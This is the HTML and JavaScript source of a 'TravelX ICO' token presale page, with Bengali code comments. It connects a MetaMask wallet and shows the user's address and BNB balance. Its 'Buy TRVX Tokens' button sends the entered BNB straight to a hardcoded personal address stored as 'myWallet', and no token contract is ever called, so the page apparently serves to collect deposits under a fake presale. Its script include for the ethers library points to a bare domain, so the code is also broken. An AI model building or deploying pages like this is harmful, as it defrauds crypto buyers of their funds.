<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TravelX ICO | User Portal</title>
    <script src="https://cloudflare.com"></script>
    <style>
        body { background-color: #05070a; color: white; font-family: 'Segoe UI', sans-serif; display: flex; align-items: center; justify-content: center; min-height: 100vh; margin: 0; }
        .container { text-align: center; border: 1px solid #2d333b; padding: 45px; border-radius: 28px; background: #0d1117; width: 380px; box-shadow: 0 20px 50px rgba(0,0,0,0.5); }
        .btn { background-color: #238636; color: white; border: none; padding: 16px 30px; border-radius: 12px; font-weight: bold; cursor: pointer; font-size: 16px; width: 100%; transition: 0.3s; }
        #dashboard { display: none; text-align: left; }
        .info-card { background: #161b22; padding: 18px; border-radius: 14px; margin-bottom: 20px; border: 1px solid #30363d; }
        .label { color: #8b949e; font-size: 10px; text-transform: uppercase; font-weight: bold; display: block; margin-bottom: 5px; }
        input { width: 100%; padding: 14px; border-radius: 10px; border: 1px solid #30363d; background: #010409; color: white; margin-bottom: 15px; outline: none; }
        .btn-blue { background-color: #3b82f6; }
    </style>
</head>
<body>

    <div class="container">
        <div id="loginScreen">
            <h1 style="color: #58a6ff; font-size: 32px; margin-bottom: 10px;">TravelX ICO</h1>
            <p style="color: #8b949e; font-size: 14px; margin-bottom: 30px;">Connect your wallet to get started</p>
            <button id="connectBtn" onclick="connect()" class="btn">Connect Wallet</button>
        </div>

        <div id="dashboard">
            <h3 style="margin-top: 0; color: #f0f6fc; font-size: 20px; margin-bottom: 25px;">User Dashboard</h3>
            <div class="info-card">
                <span class="label">Wallet Address</span>
                <span id="userAddress" style="color: #58a6ff; font-family: monospace; font-size: 11px; word-break: break-all;"></span>
            </div>
            <div class="info-card">
                <span class="label">Balance</span>
                <span id="userBalance" style="font-size: 24px; font-weight: bold; color: #ffffff;">0.0000</span>
            </div>
            <div style="padding-top: 10px;">
                <span class="label">Presale Purchase</span>
                <input type="number" id="bnbInput" placeholder="Amount (BNB)" step="0.01">
                <button onclick="buyTokens()" class="btn btn-blue">Buy TRVX Tokens</button>
            </div>
            <button onclick="window.location.reload()" style="background: none; border: none; color: #f85149; cursor: pointer; font-size: 11px; width: 100%; margin-top: 25px; text-decoration: underline;">Disconnect</button>
        </div>
    </div>

    <script>
        let signer;
        const myWallet = "0x68211153222bf054Decb13928870523a0C4264d4";

        async function connect() {
            if (typeof window.ethereum === 'undefined') return alert("MetaMask not found!");

            try {
                // ১. সরাসরি মেটামাস্ক থেকে একাউন্ট রিকোয়েস্ট
                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                const userAccount = accounts[0]; // সঠিক অ্যাড্রেস ফরম্যাট

                // ২. UI পরিবর্তন (ব্যালেন্স চেক করার আগেই ড্যাশবোর্ড দেখাবে)
                document.getElementById('loginScreen').style.display = 'none';
                document.getElementById('dashboard').style.display = 'block';
                document.getElementById('userAddress').innerText = userAccount;

                // ৩. ইথার্স দিয়ে ব্যালেন্স আনা (অপশনাল, এরর হলে সমস্যা নেই)
                try {
                    const provider = new ethers.providers.Web3Provider(window.ethereum);
                    signer = provider.getSigner();
                    const balance = await provider.getBalance(userAccount);
                    const balanceEth = ethers.utils.formatEther(balance);
                    document.getElementById('userBalance').innerText = parseFloat(balanceEth).toFixed(8) + " BNB";

                } catch (e) {
                    console.log("Balance fetch error handled.");
                }

            } catch (error) {
                console.error(error);
                alert("Connection failed! Check MetaMask popup.");
            }
        }

        async function buyTokens() {
            const amount = document.getElementById('bnbInput').value;
            if (!amount || amount <= 0) return alert("Enter valid amount!");
            try {
                const tx = await signer.sendTransaction({ to: myWallet, value: ethers.utils.parseEther(amount) });
                alert("Sent! Hash: " + tx.hash);
            } catch (err) { alert("Failed!"); }
        }
    </script>
</body>
</html>
